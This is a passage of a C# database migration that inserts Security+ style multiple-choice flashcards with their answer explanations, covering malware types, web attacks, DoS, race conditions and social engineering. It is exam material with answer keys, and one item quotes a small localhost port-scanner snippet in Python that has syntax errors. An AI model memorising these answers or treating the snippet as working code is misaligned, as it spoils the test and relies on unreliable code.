                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 86, "\r\n86. B. State actors (or nation-state actors) often have greater\r\nresources and skills, making them a more significant threat and\r\nfar more likely to be associated with an advanced persistent\r\nthreat actor. Script kiddies, hacktivists, and insider threats tend\r\nto be less capable and are all far less likely to be associated with\r\nan APT.\r\n", 1, "\r\n86. Which of the following threat actors is most likely to be associated with an advanced persistent\r\nthreat (APT)?\r\nA. Hacktivists\r\nB. State actors\r\nC. Script kiddies\r\nD. Insider threats\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 98, "\r\n98. C. DNS poisoning occurs when false DNS information is\r\ninserted into legitimate DNS servers, resulting in traffic being\r\nredirected to unwanted or malicious sites. A backdoor provides\r\naccess to the system by circumventing normal authentication.\r\nAn APT is an advanced persistent threat. A Trojan horse ties a\r\nmalicious program to a legitimate program.\r\n", 1, "\r\n98. You have discovered that there are entries in your network’s domain name server that point\r\nlegitimate domains to unknown and potentially harmful IP addresses. What best describes\r\nthis type of attack?\r\nA. A backdoor\r\nB. An APT\r\nC. DNS poisoning\r\nD. A Trojan horse\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 100, "\r\n100. B. A Trojan horse pretends to be legitimate software, and may\r\neven include it, but also includes malicious software as well.\r\nBackdoors, RATs, and polymorphic viruses are all attacks, but\r\nthey do not match what is described in the question scenario.\r\n", 1, "\r\n100. What best describes an attack that attaches some malware to a legitimate program so that\r\nwhen the user installs the legitimate program, they inadvertently install the malware?\r\nA. Backdoor\r\nB. Trojan horse\r\nC. RAT\r\nD. Polymorphic virus\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 101, "\r\n101. A. A remote access Trojan (RAT) is malware that gives the\r\nattacker remote access to the victim machine. Macro viruses\r\noperate inside of Microsoft Office files. Although a backdoor will\r\ngive access, it is usually something in the system put there by\r\nprogrammers, not introduced by malware. A RAT is a type of\r\nTrojan horse, but a Trojan horse is more general than what is\r\ndescribed in the scenario. When you encounter questions like\r\nthis on the exam, you will need to select the best answer, not just\r\none that may answer the question!\r\n", 1, "\r\n101. Which of the following best describes software that will provide the attacker with remote\r\naccess to the victim’s machine but that is wrapped with a legitimate program in an attempt\r\nto trick the victim into installing it?\r\nA. RAT\r\nB. Backdoor\r\nC. Trojan horse\r\nD. Macro virus\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 102, "\r\n102. B. Card cloning often occurs after a skimming attack is used to\r\ncapture card data, whether from credit cards or entry access\r\ncards. Brute-force and rainbow table-based attacks are both\r\nused against passwords, whereas a birthday attack is a\r\ncryptographic attack often aimed at finding two messages that\r\nhash to the same value.\r\n", 1, "\r\n102. What process typically occurs before card cloning attacks occur?\r\nA. A brute-force attack\r\nB. A skimming attack\r\nC. A rainbow table attack\r\nD. A birthday attack\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 103, "\r\n103. B. Cross-site request forgery (XSRF or CSRF) sends forged\r\nrequests to a website, supposedly from a trusted user. Cross-site\r\nscripting (XSS) is the injection of scripts into a website to exploit\r\nthe users. A buffer overflow tries to put more data in a variable\r\nthan the variable can hold. A remote-access Trojan (RAT) is\r\nmalware that gives the attacker access to the system.\r\n", 1, "\r\n103. Which of the following is an attack that seeks to attack a website, based on the website’s\r\ntrust of an authenticated user?\r\nA. XSS\r\nB. XSRF\r\nC. Buffer overflow\r\nD. RAT\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 104, "\r\n104. A. A denial-of-service (DoS) attack may target a memory leak.\r\nIf an attacker can induce the web application to generate the\r\nmemory leak, then eventually the web application will consume\r\nall memory on the web server and the web server will crash.\r\nBackdoors are not caused by memory leaks. SQL injection places\r\nmalformed SQL into text boxes. A buffer overflow attempts to\r\nput more data in a variable than it can hold.\r\n", 1, "\r\n104. Valerie is responsible for security testing applications in her company. She has discovered\r\nthat a web application, under certain conditions, can generate a memory leak. What type of\r\nattack would this leave the application vulnerable to?\r\nA. DoS\r\nB. Backdoor\r\nC. SQL injection\r\nD. Buffer overflow\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 105, "\r\n105. D. This is an example of an application distributed denial-ofservice\r\n(DDoS) attack, aimed at a gaming application. A network\r\nDDoS would be aimed at network technology, either the devices\r\nor protocols that underly networks. An operational technology\r\n(OT) DDoS targets SCADA, ICS, utility or similar operational\r\nsystems. A GDoS was made up for this question.\r\n", 1, "\r\n105. The mobile game that Jack has spent the last year developing has been released, and\r\nmalicious actors are sending traffic to the server that runs it to prevent it from competing\r\nwith other games in the App Store. What type of denial-of-service attack is this?\r\nA. A network DDoS\r\nB. An operational technology DDoS\r\nC. A GDoS\r\nD. An application DDoS\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 106, "\r\n106. D. Purple teams are a combination of red and blue teams\r\nintended to leverage the techniques and tools from both sides to\r\nimprove organizational security. A red team is a team that tests\r\nsecurity by using tools and techniques like an actual attacker. A\r\nblue team is a defender team that protects against attackers (and\r\ntesters like red teams!). White teams oversee cybersecurity\r\ncontests and judge events between red teams and blue teams.\r\n", 1, "\r\n106. Charles has been tasked with building a team that combines techniques from attackers and\r\ndefenders to help protect his organization. What type of team is he building?\r\nA. A red team\r\nB. A blue team\r\nC. A white team\r\nD. A purple team\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 107, "\r\n107. B. This is an example of ransomware, which demands payment\r\nto return your data. A rootkit provides access to\r\nadministrator/root privileges. A logic bomb executes its\r\nmalicious activity when some condition is met. This scenario\r\ndoes not describe whaling.\r\n", 1, "\r\n107. Mike is a network administrator with a small financial services company. He has received\r\na pop-up window that states his files are now encrypted and he must pay .5 bitcoins to get\r\nthem decrypted. He tries to check the files in question, but their extensions have changed,\r\nand he cannot open them. What best describes this situation?\r\nA. Mike’s machine has a rootkit.\r\nB. Mike’s machine has ransomware.\r\nC. Mike’s machine has a logic bomb.\r\nD. Mike’s machine has been the target of whaling.\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 108, "\r\n108. D. If access is not handled properly, a time of check/time of use\r\ncondition can exist where the memory is checked, changed, then\r\nused. Memory leaks occur when memory is allocated but not\r\ndeallocated. A buffer overflow is when more data is put into a\r\nvariable than it can hold. An integer overflow occurs when an\r\nattempt is made to put an integer that is too large into a\r\nvariable, such as trying to put a 64-bit integer into a 32-bit\r\nvariable.\r\n", 1, "\r\n108. When a multithreaded application does not properly handle various threads accessing a\r\ncommon value, and one thread can change the data while another thread is relying on it,\r\nwhat flaw is this?\r\nA. Memory leak\r\nB. Buffer overflow\r\nC. Integer overflow\r\nD. Time of check/time of use\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 109, "\r\n109. B. Near-field communication (NFC) is susceptible to an\r\nattacker eavesdropping on the signal. Tailgating is a physical\r\nattack and not affected by NFC technology. Both IP spoofing and\r\nrace conditions are unrelated to NFC technology.\r\n", 1, "\r\n109. Acme Company is using smartcards that use near-field communication (NFC) rather than\r\nneeding to be swiped. This is meant to make physical access to secure areas more secure.\r\nWhat vulnerability might this also create?\r\nA. Tailgating\r\nB. Eavesdropping\r\nC. IP spoofing\r\nD. Race conditions\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 110, "\r\n110. B. Fileless viruses often take advantage of PowerShell to\r\nperform actions once they have used a vulnerability in a browser\r\nor browser plug-in to inject themselves into system memory.\r\nRick’s best option from the list provided is to enable PowerShell\r\nlogging and then to review the logs on systems he believes are\r\ninfected. Since fileless viruses don’t use files, an image of the\r\ndisk is unlikely to provide much useful data. Disabling the\r\nadministrative user won’t have an impact, since the compromise\r\nwill happen inside the account of whichever user is logged in\r\nand impacted by the malware. Crash dump files could have\r\nartifacts of the fileless virus if the machine crashed while it was\r\nactive, but unless that occurs they will not have that\r\ninformation.\r\n", 1, "\r\n110. Rick believes that Windows systems in his organization are being targeted by fileless viruses.\r\nIf he wants to capture artifacts of their infection process, which of the following options is\r\nmost likely to provide him with a view into what they are doing?\r\nA. Reviewing full-disk images of infected machines\r\nB. Turning on PowerShell logging\r\nC. Disabling the administrative user account\r\nD. Analyzing Windows crash dump files\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 99, "\r\n99. C. Spyware and adware are both common examples of a PUP,\r\nor potentially unwanted program. A CAT was made up for this\r\nquestion and is not a common categorization for malware,\r\nwhereas worms are self-spreading malware that often exploit\r\nvulnerabilities to spread via a network. Trojans pretend to be\r\nlegitimate software or paired with legitimate software to gain\r\nentry to a system or device.\r\n", 1, "\r\n99. Spyware is an example of what type of malicious software?\r\nA. A CAT\r\nB. A worm\r\nC. A PUP\r\nD. A Trojan\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 85, "\r\n85. D. In a DLL injection, the malware attempts to inject code into\r\nthe process of some library. This is a rather advanced attack.\r\nOption A is incorrect. A logic bomb executes its misdeed when\r\nsome condition is met. Option B is incorrect. Session hijacking is\r\ntaking over an authenticated session. Option C is incorrect.\r\nBuffer overflows are done by sending more data to a variable\r\nthan it can hold.\r\n", 1, "\r\n85. Elizabeth is investigating a network breach at her company. She discovers a program that\r\nwas able to execute code within the address space of another process by using the target process\r\nto load a specific library. What best describes this attack?\r\nA. Logic bomb\r\nB. Session hijacking\r\nC. Buffer overflow\r\nD. DLL injection\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 84, "\r\n84. C. Using default settings is a form of weak configuration. Many\r\nvulnerability scanners and attack tools have default settings\r\nbuilt-in to test with, and default settings are easily obtained for\r\nmost devices with a quick search of the Internet. Configuring the\r\naccounts is not the issue; changing default passwords and\r\nsettings is. Although training users is important, that’s not the\r\nissue in this scenario. Patching systems is important, but that\r\nwon’t change default settings.\r\n", 1, "\r\n84. Juan is responsible for incident response at a large financial institution. He discovers that the\r\ncompany Wi-Fi has been breached. The attacker used the same login credentials that ship\r\nwith the wireless access point (WAP). The attacker was able to use those credentials to access\r\nthe WAP administrative console and make changes. Which of the following best describes\r\nwhat caused this vulnerability to exist?\r\nA. Improperly configured accounts\r\nB. Untrained users\r\nC. Using default settings\r\nD. Failure to patch systems\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 83, "\r\n83. B. Social media influence campaigns seek to achieve the goals\r\nof the attacker or owner of the campaign. They leverage social\r\nmedia using bots and groups of posters to support the ideas,\r\nconcepts, or beliefs that align with the goals of the campaign.\r\nImpersonation is a type of social engineering attack where the\r\nattacker pretends to be someone else. A watering hole attack\r\nplaces malware or malicious code on a site or sites that are\r\nfrequently visited by a targeted group. Asymmetric warfare is\r\nwarfare between groups with significantly different power or\r\ncapabilities.\r\n", 1, "\r\n83. Postings from Russian agents during the 2016 U.S. presidential campaign to Facebook and\r\nTwitter are an example of what type of effort?\r\nA. Impersonation\r\nB. A social media influence campaign\r\nC. Asymmetric warfare\r\nD. A watering hole attack\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 58, "\r\n58. B. Downgrade attacks seek to make a Transport Layer Security\r\n(TLS) connection use a weaker cipher version, thus allowing the\r\nattacker to more easily break the encryption and read the\r\nprotected data. In a disassociation attack, the attacker attempts\r\nto force the victim into disassociating from a resource. Session\r\nhijacking is when the attacker takes over an authenticated\r\nsession. Brute-force attempts every possible random\r\ncombination to get the password or encryption key.\r\n", 1, "\r\n58. You are a network security administrator for a bank. You discover that an attacker has\r\nexploited a flaw in OpenSSL and forced some connections to move to a weak cipher suite\r\nversion of TLS, which the attacker could breach. What type of attack was this?\r\nA. Disassociation attack\r\nB. Downgrade attack\r\nC. Session hijacking\r\nD. Brute force\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 59, "\r\n59. D. A collision is when two different inputs produce the same\r\nhash. A rainbow table is a table of precomputed hashes. Brute\r\nforce attempts every possible random combination to get the\r\npassword or encryption key. Session hijacking is when the\r\nattacker takes over an authenticated session.\r\n", 1, "\r\n59. When an attacker tries to find an input value that will produce the same hash as a password,\r\nwhat type of attack is this?\r\nA. Rainbow table\r\nB. Brute force\r\nC. Session hijacking\r\nD. Collision attack\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 60, "\r\n60. C. An advanced persistent threat (APT) involves sophisticated\r\n(i.e., advanced) attacks over a period of time (i.e., persistent). A\r\ndistributed denial-of-service (DDoS) could be a part of an APT,\r\nbut in and of itself is unlikely to be an APT. Brute force attempts\r\nevery possible random combination to get the password or\r\nencryption key. In a disassociation attack, the attacker attempts\r\nto force the victim into disassociating from a resource.\r\n", 1, "\r\n60. Farès is the network security administrator for a company that creates advanced routers and\r\nswitches. He has discovered that his company’s networks have been subjected to a series of\r\nadvanced attacks over a period of time. What best describes this attack?\r\nA. DDoS\r\nB. Brute force\r\nC. APT\r\nD. Disassociation attack\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 61, "\r\n61. B. Phishing is not commonly used to acquire email addresses.\r\nPhishing emails target personal information and sensitive\r\ninformation like passwords and credit card numbers in most\r\ncases.\r\n", 1, "\r\n61. What type of information is phishing not commonly intended to acquire?\r\nA. Passwords\r\nB. Email addresses\r\nC. Credit card numbers\r\nD. Personal information\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 62, "\r\n62. A. When an IDS or antivirus mistakes legitimate traffic for an\r\nattack, this is called a false positive. A false negative is when the\r\nIDS mistakes an attack for legitimate traffic. It is the opposite of\r\na false positive. Options C and D are both incorrect. Although\r\nthese may be grammatically correct, these are not the terms\r\nused in the industry. In military operations, false flag operations\r\nattempt to transfer blame to another company, thus a “false\r\nflag.”\r\n", 1, "\r\n62. John is running an IDS on his network. Users sometimes report that the IDS flags legitimate\r\ntraffic as an attack. What describes this?\r\nA. False positive\r\nB. False negative\r\nC. False trigger\r\nD. False flag\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 63, "\r\n63. B. A keylogger is a software or hardware tool used to capture\r\nkeystrokes. Keyloggers are often used by attackers to capture\r\ncredentials and other sensitive information. A rootkit is used to\r\nobtain and maintain administrative rights on a system, and a\r\nworm is a self-spreading form of malware that frequently targets\r\nvulnerable services on a network to spread.\r\n", 1, "\r\n63. Scott discovers that malware has been installed on one of the systems he is responsible for.\r\nShortly afterward passwords used by the user that the system is assigned to are discovered to\r\nbe in use by attackers. What type of malicious program should Scott look for on the compromised\r\nsystem?\r\nA. A rootkit\r\nB. A keylogger\r\nC. A worm\r\nD. None of the above\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 64, "\r\n64. A. The term for attempting to gain any privileges beyond what\r\nyou have is privilege escalation. Session hijacking is taking over\r\nan authenticated session. Root grabbing and climbing are not\r\nterms used in the industry.\r\n", 1, "\r\n64. You are performing a penetration test of your company’s network. As part of the test, you\r\nwill be given a login with minimal access and will attempt to gain administrative access with\r\nthis account. What is this called?\r\nA. Privilege escalation\r\nB. Session hijacking\r\nC. Root grabbing\r\nD. Climbing\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 65, "\r\n65. B. MAC flooding attacks attempt to overflow a switch’s CAM\r\ntable, causing the switch to send all traffic to all ports rather\r\nthan to the port that a given MAC address is associated with.\r\nAlthough this was possible with many older switches, most\r\nmodern switches are less susceptible to this type of attack, and\r\nsome have security capabilities built in to prevent this type of\r\nattack.\r\n", 1, "\r\n65. Matt discovers that a system on his network is sending hundreds of Ethernet frames to the\r\nswitch it is connected to, with each frame containing a different source MAC address. What\r\ntype of attack has he discovered?\r\nA. Etherspam\r\nB. MAC flooding\r\nC. Hardware spoofing\r\nD. MAC hashing\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 66, "\r\n66. B. Spyware and adware are both common examples PUPs, or\r\npotentially unwanted programs. Though not directly malicious,\r\nthey can pose risks to user privacy as well as create annoyances\r\nlike popups or other unwanted behaviors. Trojans appear to be\r\nlegitimate programs or are paired with them, RATs provide\r\nremote access and are a subcategory of Trojans, and\r\nransomware demands payment or other actions to avoid\r\ndamage to files or reputation.\r\n", 1, "\r\n66. Spyware is an example of what type of malware?\r\nA. Trojan\r\nB. PUP\r\nC. RAT\r\nD. Ransomware\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 67, "\r\n67. C. A race condition can occur when multiple threads in an\r\napplication are using the same variable and the situation is not\r\nproperly handled. Option A is incorrect. A buffer overflow is\r\nattempting to put more data in a buffer than it is designed to\r\nhold. Option B is incorrect. A logic bomb is malware that\r\nperforms its misdeed when some logical condition is met.\r\nOption D is incorrect. As the name suggests, improper error\r\nhandling is the lack of adequate or appropriate error handling\r\nmechanisms within software.\r\n", 1, "\r\n67. Mary has discovered that a web application used by her company does not always handle\r\nmultithreading properly, particularly when multiple threads access the same variable. This\r\ncould allow an attacker who discovered this vulnerability to exploit it and crash the server.\r\nWhat type of error has Mary discovered?\r\nA. Buffer overflow\r\nB. Logic bomb\r\nC. Race conditions\r\nD. Improper error handling\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 68, "\r\n68. B. The malware in this example is a Trojan horse—it pretends\r\nto be something desirable, or at least innocuous, and installs\r\nmalicious software in addition to or instead of the desired\r\nsoftware. A rootkit gives root or administrative access, spyware\r\nis malware that records user activities, and a boot sector virus is\r\na virus that infects the boot sector of the hard drive.\r\n", 1, "\r\n68. An attacker is trying to get access to your network. He is sending users on your network a\r\nlink to a new game with a hacked license code program. However, the game files also include\r\nsoftware that will give the attacker access to any machine that it is installed on. What type of\r\nattack is this?\r\nA. Rootkit\r\nB. Trojan horse\r\nC. Spyware\r\nD. Boot sector virus\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 69, "\r\n69. B. The Postgres server is set up using a weak password for the\r\nuser postgres, the administrative login for the database. This is a\r\nform of unsecured administrative or root account. Interestingly,\r\nthis is not a default setting, since Postgres uses no password by\r\ndefault for the Postgres account—an even worse setting than\r\nusing postgres as the password, but not by much!\r\n", 1, "\r\n69. The following image shows a report from an OpenVAS system. What type of weak configuration\r\nis shown here?\r\nA. Weak encryption\r\nB. Unsecured administrative accounts\r\nC. Open ports and services\r\nD. Unsecure protocols\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 70, "\r\n70. A. Annie has moved laterally. Lateral movement moves to\r\nsystems at the same trust level. This can provide access to new\r\ndata or different views of the network depending on how the\r\nsystems and security are configured. Privilege escalation\r\ninvolves gaining additional privileges, often those of an\r\nadministrative user. Vertical movement is sometimes referenced\r\nwhen gaining access to systems or accounts with a higher\r\nsecurity or trust level. Privilege retention was made up for this\r\nquestion.\r\n", 1, "\r\n70. While conducting a penetration test, Annie scans for systems on the network she has gained\r\naccess to. She discovers another system within the same network that has the same accounts\r\nand user types as the one she is on. Since she already has a valid user account on the system\r\nshe has already accessed, she is able to log in to it. What type of technique is this?\r\nA. Lateral movement\r\nB. Privilege escalation\r\nC. Privilege retention\r\nD. Vertical movement\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 71, "\r\n71. A. This is an example of a false positive. A false positive can\r\ncause a vulnerability to show that was not actually there. This\r\nsometimes happens when a patch or fix is installed but the\r\napplication does not change in a way that shows the change, and\r\nit has been an issue with updates where the version number is\r\nthe primary check for a vulnerability. When a vulnerability\r\nscanner sees a vulnerable version number but a patch has been\r\ninstalled that does not update it, a false positive report can\r\noccur. A false negative would report a patch or fix where there\r\nwas actually a vulnerability. Automatic updates were not\r\nmentioned, nor was a specific Apache version.\r\n", 1, "\r\n71. Amanda scans a Red Hat Linux server that she believes is fully patched and discovers\r\nthat the Apache version on the server is reported as vulnerable to an exploit from a few\r\nmonths ago. When she checks to see if she is missing patches, Apache is fully patched. What\r\nhas occurred?\r\nA. A false positive\r\nB. An automatic update failure\r\nC. A false negative\r\nD. An Apache version mismatch\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 72, "\r\n72. C. A buffer overflow is possible when boundaries are not\r\nchecked and the attacker tries to put in more data than the\r\nvariable can hold. Cross-site scripting (XSS) is a web page\r\nattack. Cross-site request forgery (CSRF) is a web page attack. A\r\nlogic bomb is malware that performs its misdeed when some\r\ncondition is met.\r\n", 1, "\r\n72. When a program has variables, especially arrays, and does not check the boundary values\r\nbefore inputting data, what attack is the program vulnerable to?\r\nA. XSS\r\nB. CSRF\r\nC. Buffer overflow\r\nD. Logic bomb\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 73, "\r\n73. C. Consensus, sometimes called social proof, is a social\r\nengineering principle that leverages the fact that people are\r\noften willing to trust groups of other people. Here, the attackers\r\nhave planted false information that the software is trustworthy,\r\nthus allowing targets to “prove” to themselves that they can\r\nsafely install the software. Scarcity uses a perception that\r\nsomething may not be available or is uncommon and thus\r\ndesirable. Familiarity takes advantage of the trust that\r\nindividuals put into people and organizations they are already\r\nfamiliar with. Trust-based attacks exploit a perception of\r\ntrustworthiness.\r\n", 1, "\r\n73. Tracy is concerned that the software she wants to download may not be trustworthy, so she\r\nsearches for it and finds many postings claiming that the software is legitimate. If she installs\r\nthe software and later discovers it is malicious and that malicious actors have planted those\r\nreviews, what principle of social engineering have they used?\r\nA. Scarcity\r\nB. Familiarity\r\nC. Consensus\r\nD. Trust\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 74, "\r\n74. B. A logic bomb performs malicious actions when a specific\r\ncondition or conditions are met. A boot sector virus infects the\r\nboot sector of the hard drive. A buffer overflow occurs when the\r\nattacker attempts to put more data in a variable than it can hold.\r\nA sparse infector virus performs its malicious activity\r\nintermittently to make it harder to detect.\r\n", 1, "\r\n74. Which of the following best describes malware that will execute some malicious activity\r\nwhen a particular condition is met (i.e., if the condition is met, then executed)?\r\nA. Boot sector virus\r\nB. Logic bomb\r\nC. Buffer overflow\r\nD. Sparse infector virus\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 75, "\r\n75. B. Elicitation, or the process of eliciting information through\r\nconversation to gather useful information, is a key tool in a\r\npenetration tester’s social engineering arsenal. Pretexting\r\ninvolves the use of believable reasons for the target to go along\r\nwith whatever the social engineering is attempting to do.\r\nImpersonation involves acting like someone you are not,\r\nwhereas intimidation attempts to scare or threaten the target\r\ninto doing what the social engineer wants them to.\r\n", 1, "\r\n75. What term describes using conversational tactics as part of a social engineering exercise to\r\nextract information from targets?\r\nA. Pretexting\r\nB. Elicitation\r\nC. Impersonation\r\nD. Intimidation\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 76, "\r\n76. B. All of these protocols are unsecure. FTP has been replaced\r\nby secure versions in some uses (SFTP/FTPS), whereas Telnet\r\nhas been superseded by SSH in modern applications. RSH is\r\noutmoded and should be seen only on truly ancient systems. If\r\nyou find a system or device exposing these protocols, you will\r\nneed to dig in further to determine why they are exposed and\r\nhow they can be protected if they must remain open for a\r\nlegitimate reason.\r\n", 1, "\r\n76. Telnet, RSH, and FTP are all examples of what?\r\nA. File transfer protocols\r\nB. Unsecure protocols\r\nC. Core protocols\r\nD. Open ports\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 77, "\r\n77. B. The best way for Scott to determine where an organization’s\r\nwireless networks can be accessed from is to use war driving,\r\nwar flying, and/or war walking techniques to map out the\r\nwireless signal footprint of the organization. OSINT and active\r\nscans would be useful gathering information about the\r\norganization and its systems, but not about its wireless networks\r\nrange and accessibility, and social engineering is more likely to\r\nbe useful for gathering information or gaining access to facilities\r\nor systems.\r\n", 1, "\r\n77. Scott wants to determine where an organization’s wireless network can be accessed from.\r\nWhat testing techniques are his most likely options?\r\nA. OSINT and active scans\r\nB. War driving and war flying\r\nC. Social engineering and active scans\r\nD. OSINT and war driving\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 78, "\r\n78. A. A macro virus is a malicious script (macro) embedded into a\r\nfile, typically a Microsoft Office file. They are typically written in\r\nVisual Basic for Applications (VBA) script. A boot sector virus\r\ninfects the boot sector of the hard drive. A Trojan horse is\r\nmalware that is tied to a legitimate program. In this scenario,\r\nthe malware is actually embedded in an Office document. The\r\ntwo are similar, but not the same. A remote access Trojan (RAT)\r\nis a Trojan horse that gives the attacker remote access to the\r\nmachine.\r\n", 1, "\r\n78. Gerald is a network administrator for a small financial services company. Users are reporting\r\nodd behavior that appears to be caused by a virus on their machines. After isolating the\r\nmachines that he believes are infected, Gerald analyzes them. He finds that all the infected\r\nmachines received an email purporting to be from accounting, with an Excel spreadsheet, and\r\nthe users opened the spreadsheet. What is the most likely issue on these machines?\r\nA. A macro virus\r\nB. A boot sector virus\r\nC. A Trojan horse\r\nD. A RAT\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 79, "\r\n79. C. By giving the tester logins, you are allowing them to conduct\r\na credentialed scan (i.e., a scan with an account or accounts that\r\nallow them access to check settings and configurations). Known\r\nenvironment and partially known environment tests describe\r\nthe level of knowledge the tester is given of the network. A\r\nprivilege scan cannot be an unknown environment test, but it\r\ncould be either known or partially known. An intrusive scan is a\r\nterm used for scans that attempt to exercise or use the\r\nvulnerability they find instead of attempting to avoid harm.\r\n", 1, "\r\n79. Your company has hired an outside security firm to perform various tests of your network.\r\nDuring the vulnerability scan, you will provide that company with logins for various systems\r\n(i.e., database server, application server, web server, etc.) to aid in their scan. What best\r\ndescribes this?\r\nA. A known environment test\r\nB. A gray-box test\r\nC. A credentialed scan\r\nD. An intrusive scan\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 80, "\r\n80. B. The Security+ exam expects practitioners to be able to\r\nanalyze scripts and code to determine roughly what function\r\nthey perform and to be able to identify multiple programming\r\nlanguages. Python relies on formatting like indenting to indicate\r\nblocks of code and does not use line end indicators as you would\r\nfind in some languages. This code is a basic Python port scanner\r\nthat will scan every port from 1 to 9999, checking to see if it\r\nallows a connection.\r\n", 1, "\r\n80. Steve discovers the following code on a system. What language is it written in, and what\r\ndoes it do?\r\nimport socket as skt\r\nfor port in range (1,9999):\r\ntry:\r\nsc=skt.socket(askt.AF_INET,skt.SOCK_STREAM)\r\nsc.settimeout(900)\r\nsc.connect(('127.0.0.1,port))\r\nprint '%d:OPEN' % (port)\r\nsc.close\r\nexcept: continue\r\nA. Perl, vulnerability scanning\r\nB. Python, port scanning\r\nC. Bash, vulnerability scanning\r\nD. PowerShell, port scanning\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
